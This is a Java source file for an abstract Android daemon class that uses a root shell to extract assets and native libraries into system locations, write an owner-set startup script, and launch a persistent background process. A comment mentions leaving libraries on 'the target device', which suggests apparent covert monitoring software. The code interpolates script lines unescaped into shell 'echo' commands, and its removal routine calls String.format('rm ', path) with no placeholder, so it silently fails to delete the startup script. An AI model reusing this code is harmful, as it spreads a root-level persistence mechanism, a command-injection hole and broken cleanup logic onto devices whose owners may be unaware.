package com.fx.daemon;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.StringReader;

import android.content.Context;

import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.Shell;
import com.vvt.shell.ShellUtil;

public abstract class Daemon {
	
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	protected static final String FORMAT_APP_PROCESS = "app_process /system/bin %s \\$* &\n";
	protected static final String FORMAT_CLASSPATH = "export CLASSPATH=%s/%s;\n";
	protected static final String FORMAT_LIBRARY = "export LD_LIBRARY_PATH=%s\n";
	
	protected abstract void createStartupScript() throws Exception;
	protected abstract String getExtractingResourcePath();
	protected abstract String getNativeLibraryPath();
	protected abstract String getTag();
	protected abstract String[] getNativeLibraryFilenames();
	protected abstract String[] getResourceFilenames();
	protected abstract String getProcessName();
	protected abstract String getStartupScriptPath();
	
	/**
	 * Note: Don't forget to remount /system as read-write before start the operation
	 * @param appContext
	 * @throws InstallationException
	 */
	public void setupDaemon(Context appContext) throws InstallationException {
		if (LOGD) FxLog.d(getTag(), "setupDaemon # ENTER ...");
		
		if (LOGD) FxLog.d(getTag(), "setupDaemon # Make directories");
		try {
			String resourcePath = getExtractingResourcePath();
			DaemonHelper.createDirectory(resourcePath);
			
			String libPath = getNativeLibraryPath();
			if (! libPath.equals(resourcePath)) {
				DaemonHelper.createDirectory(getNativeLibraryPath());
			}
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format(
					"setupDaemon # Create directory failed!! %s", e));
			throw new InstallationException();
		}
		
		if (LOGD) FxLog.d(getTag(), "setupDaemon # Extract resources");
		try {
			extractFile(appContext, getExtractingResourcePath(), getResourceFilenames());
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format(
					"setupDaemon # Extract resources failed!! %s", e));
			throw new InstallationException();
		}
		
		if (LOGD) FxLog.d(getTag(), "setupDaemon # Extract library");
		try {
			extractFile(appContext, getNativeLibraryPath(), getNativeLibraryFilenames());
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format(
					"setupDaemon # Extract library failed!! %s", e));
			throw new InstallationException();
		}
		
		if (LOGD) FxLog.d(getTag(), "setupDaemon # Create startup script");
		try {
			createStartupScript();
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format(
					"setupDaemon # Create startup script failed!! %s", e));
			throw new InstallationException();
		}
		
		if (LOGD) FxLog.d(getTag(), "setupDaemon # EXIT ...");
	}
	
	public void startDaemon() throws RunningException {
		if (LOGV) FxLog.v(getTag(), "startDaemon # ENTER ...");
		String startupScript = getStartupScriptPath();
		try {
			Shell rootShell = Shell.getRootShell();
			rootShell.exec(startupScript);
			rootShell.terminate();
		}
		catch (CannotGetRootShellException e) {
			if (LOGE) FxLog.e(getTag(), String.format("startDaemon # Error: %s", e));
			throw new RunningException();
		}
		if (LOGV) FxLog.v(getTag(), "startDaemon # EXIT ...");
	}
	
	public void stopDaemon() {
		if (LOGV) FxLog.v(getTag(), "stopDaemon # ENTER ...");
		ShellUtil.killProcessByName(getProcessName());
		if (LOGV) FxLog.v(getTag(), "stopDaemon # EXIT ...");
	}
	
	/**
	 * This method will erase almost everything that is required for 
	 * running the process, except the native library since it could be shared with others. 
	 * Note: Don't forget to remount /system as read-write before start the operation
	 */
	public void removeDaemon() throws CannotGetRootShellException {
		if (LOGV) FxLog.v(getTag(), "removeDaemon # ENTER ...");
		
		Shell rootShell = Shell.getRootShell();
		
		if (LOGV) FxLog.v(getTag(), "removeDaemon # Delete startup script");
		String startupScriptPath = getStartupScriptPath();
		rootShell.exec(String.format("rm ", startupScriptPath));
		
		if (LOGV) FxLog.v(getTag(), "removeDaemon # Delete resources");
		String extractingPath = getExtractingResourcePath();
		if (! extractingPath.trim().endsWith("/")) {
			extractingPath = String.format("%s/", extractingPath);
		}
		String[] resources = getResourceFilenames();
		for (String filename : resources) {
			rootShell.exec(String.format("rm %s%s", extractingPath, filename));
		}
		
		if (LOGV) FxLog.v(getTag(), "removeDaemon # Delete folder");
		rootShell.exec(String.format("rm -r %s", extractingPath));
		
		rootShell.terminate();
		
		// Stop the process
		if (LOGV) FxLog.v(getTag(), "removeDaemon # Stop daemon");
		stopDaemon();
		
		if (LOGV) FxLog.v(getTag(), "removeDaemon # EXIT ...");
	}
	
	/**
	 * At the moment, I plan to leave the native library in the target device
	 * Note: Don't forget to remount /system as read-write before start the operation
	 */
	public void removeNativeLibrary() {
		if (LOGV) FxLog.v(getTag(), "removeNativeLibrary # ENTER ...");
		
		String path = getNativeLibraryPath();
		if (! path.trim().endsWith("/")) {
			path = String.format("%s/", path);
		}
		
		if (LOGV) FxLog.v(getTag(), "removeNativeLibrary # Delete native libs");
		try {
			Shell rootShell = Shell.getRootShell();
			
			String[] filenames = getNativeLibraryFilenames();
			for (String filename : filenames) {
				rootShell.exec(String.format("rm %s%s", path, filename));
			}
			
			// We don't delete folder for native libraries
			// Because sometimes we keep it with /system/libs 
			
			rootShell.terminate();
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format("removeNativeLibrary # Error!! %s", e));
		}
		
		if (LOGV) FxLog.v(getTag(), "removeNativeLibrary # EXIT ...");
	}
	
	public boolean isAvailable() {
		return ShellUtil.isProcessRunning(getProcessName());
	}
	
	protected void createStartupScriptFile(String scriptPath, String script) throws Exception {
		if (LOGV) FxLog.v(getTag(), "createStartupScriptFile # ENTER ...");
	
		Shell rootShell = Shell.getRootShell();
		
		BufferedReader reader = new BufferedReader(new StringReader(script));
		String line = null;
		while ((line = reader.readLine()) != null) {
			rootShell.exec(String.format("echo \"%s\" >> %s", line, scriptPath));
		}
		
		rootShell.exec(String.format("chown system.system %s", scriptPath));
		rootShell.exec(String.format("chmod 755 %s", scriptPath));
		rootShell.terminate();
		
		boolean isStartupScriptCreated = isStartupScriptCreated(scriptPath, script);
		if (! isStartupScriptCreated) {
			if (LOGV) FxLog.v(getTag(), 
					"createStartupScriptFile # Script is not created properly!!");
			throw new InstallationException();
		}
		
		if (LOGV) FxLog.v(getTag(), "createStartupScriptFile # EXIT ...");
	}
	private void extractFile(Context appContext, String targetPath, String[] resources) 
			throws InstallationException {
		
		if (LOGV) FxLog.v(getTag(), "extractFile # ENTER ...");
		
		try {
			for (String filename : resources) {
				DaemonHelper.extractAsset(appContext, filename, targetPath);
			}
			if (LOGV) FxLog.v(getTag(), "extractFile # Extract done");
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format("extractFile # Extract failed!! %s", e));
			throw new InstallationException();
		}
		
		if (LOGV) FxLog.v(getTag(), "extractFile # Recheck");
		boolean isResourceExtracted = false;
		try {
			isResourceExtracted = isResourceExtracted(targetPath, resources);
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(getTag(), String.format("extractFile # Recheck failed!! %s", e));
		}
		if (! isResourceExtracted) {
			if (LOGV) FxLog.v(getTag(), "extractFile # Extract failed!!");
			throw new InstallationException();
		}
		
		if (LOGV) FxLog.v(getTag(), "extractFile # EXIT ...");
	}
	
	private boolean isResourceExtracted(String targetPath, String[] resources)
			throws CannotGetRootShellException, IOException {
		
		if (LOGV) FxLog.v(getTag(), "isDaemonExtracted # ENTER ...");
		
		if (! targetPath.trim().endsWith("/")) {
			targetPath = String.format("%s/", targetPath);
		}
		
		Shell rootShell = Shell.getRootShell();
		String output = rootShell.exec(String.format("/system/bin/ls %s*", targetPath));
		rootShell.terminate();
		
		boolean isResourceExtracted = !output.contains(Shell.NO_SUCH_FILE);
		
		if (isResourceExtracted) {
			for (String resource : resources) {
				isResourceExtracted &= output.contains(resource);
			}
		}
		
		if (LOGV) FxLog.v(getTag(), String.format("isDaemonExtracted: %s", isResourceExtracted));
		
		if (LOGV) FxLog.v(getTag(), "isDaemonExtracted # EXIT ...");
		
		return isResourceExtracted;
	}
	
	private boolean isStartupScriptCreated(String scriptPath, String script) 
			throws CannotGetRootShellException, IOException {
		
		if (LOGV) FxLog.v(getTag(), "isStartupScriptCreated # ENTER ...");
		
		Shell rootShell = Shell.getRootShell();
		String listResult = rootShell.exec(String.format("/system/bin/ls %s", scriptPath));
		String catResult = rootShell.exec(String.format("cat %s", scriptPath));
		rootShell.terminate();
		
		String reformScript = script.replaceAll("[^\\w]","");
		if (LOGV) FxLog.v(getTag(), String.format("reformScript: %s", reformScript));
		
		String reformCatResult = catResult.replaceAll("[^\\w]","");
		if (LOGV) FxLog.v(getTag(), String.format("reformCatResult: %s", reformCatResult));
		
		boolean isStartupScriptCreated = 
			!listResult.contains(Shell.NO_SUCH_FILE) && 
			reformCatResult.contains(reformScript);
		
		if (LOGV) FxLog.v(getTag(), String.format("isStartupScriptCreated: %s", isStartupScriptCreated));
		
		if (LOGV) FxLog.v(getTag(), "isStartupScriptCreated # EXIT ...");
		
		return isStartupScriptCreated;
	}
	
}
